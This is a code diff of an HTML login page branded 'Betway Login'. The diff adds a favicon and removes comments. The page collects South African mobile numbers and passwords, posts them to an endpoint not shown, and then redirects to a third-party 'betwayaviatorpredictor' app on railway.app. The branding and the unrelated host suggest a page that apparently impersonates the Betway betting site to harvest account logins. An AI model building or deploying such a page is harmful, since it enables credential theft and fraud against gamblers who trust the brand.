@@ -4,6 +4,8 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Betway Login</title>
+    <!-- FAVICON FIX -->
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🎰</text></svg>" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
     <style>
         * {
@@ -128,7 +130,6 @@
             color: #f5c518;
         }
 
-        /* LOGIN BUTTON */
         .login-btn {
             width: 100%;
             padding: 16px;
@@ -165,7 +166,6 @@
             transform: scale(0.98);
         }
 
-        /* SPINNER */
         .spinner {
             display: none;
             width: 24px;
@@ -232,7 +232,6 @@
             text-decoration: underline;
         }
 
-        /* MESSAGE */
         #message {
             padding: 12px 16px;
             border-radius: 10px;
@@ -257,7 +256,6 @@
             color: #00c45a;
         }
 
-        /* OVERLAY LOADING */
         .loading-overlay {
             display: none;
             position: absolute;
@@ -316,7 +314,6 @@
 
     <div class="login-container">
 
-        <!-- LOADING OVERLAY -->
         <div class="loading-overlay" id="loadingOverlay">
             <div class="big-spinner"></div>
             <p>Processing your request...</p>
@@ -364,12 +361,10 @@
     </div>
 
     <script>
-        // Wait for page to load
         document.addEventListener('DOMContentLoaded', function() {
             
             console.log('✅ Page loaded!');
 
-            // Get elements
             const mobileInput = document.getElementById('mobileNumber');
             const passwordInput = document.getElementById('password');
             const loginBtn = document.getElementById('loginBtn');
@@ -378,7 +373,6 @@
             const messageDiv = document.getElementById('message');
             const loadingOverlay = document.getElementById('loadingOverlay');
 
-            // Function to show message
             function showMessage(text, type) {
                 messageDiv.textContent = text;
                 messageDiv.className = type;
@@ -390,7 +384,6 @@
                 messageDiv.className = '';
             }
 
-            // Function to show loading state
             function showLoading() {
                 loginBtn.disabled = true;
                 spinner.classList.add('active');
@@ -398,7 +391,6 @@
                 loadingOverlay.classList.add('active');
             }
 
-            // Function to hide loading state
             function hideLoading() {
                 loginBtn.disabled = false;
                 spinner.classList.remove('active');
@@ -406,7 +398,6 @@
                 loadingOverlay.classList.remove('active');
             }
 
-            // Login function
             async function handleLogin(event) {
                 if (event) {
                     event.preventDefault();
@@ -414,30 +405,23 @@
 
                 console.log('🔑 Login button clicked!');
 
-                // Get values
                 const mobileNumber = mobileInput.value.trim();
                 const password = passwordInput.value.trim();
 
                 console.log('📱 Mobile:', mobileNumber);
-                console.log('🔒 Password:', password ? '******' : 'empty');
 
-                // Validate
                 if (!mobileNumber || !password) {
                     showMessage('⚠️ Please enter both mobile number and password.', 'error');
                     return;
                 }
 
-                // Validate SA number
                 const mobileRegex = /^(\+27|0)[6-8][0-9]{8}$/;
                 if (!mobileRegex.test(mobileNumber)) {
                     showMessage('⚠️ Please enter a valid SA number (e.g., 0712345678)', 'error');
                     return;
                 }
 
-                // Hide previous messages
                 hideMessage();
-
-                // SHOW LOADING
                 showLoading();
                 console.log('⏳ Loading started...');
 
@@ -461,13 +445,10 @@
                     const data = await response.json();
                     console.log('📦 Response data:', data);
 
-                    // HIDE LOADING
                     hideLoading();
 
                     if (data.success) {
                         showMessage('✅ Login successful! Redirecting...', 'success');
-                        
-                        // Show loading again for redirect
                         showLoading();
                         setTimeout(() => {
                             window.location.href = 'https://betwayaviatorpredictor-production.up.railway.app';
@@ -483,7 +464,6 @@
                 }
             }
 
-            // Event listener for login button
             loginBtn.addEventListener('click', function(e) {
                 console.log('🖱️ Button clicked!');
                 handleLogin(e);
@@ -491,7 +471,6 @@
 
             console.log('✅ Button listener attached!');
 
-            // Enter key support
             document.addEventListener('keypress', function(e) {
                 if (e.key === 'Enter') {
                     const active = document.activeElement;
@@ -502,7 +481,6 @@
                 }
             });
 
-            // Hide message when typing
             mobileInput.addEventListener('input', function() {
                 if (messageDiv.className === 'error') {
                     hideMessage();
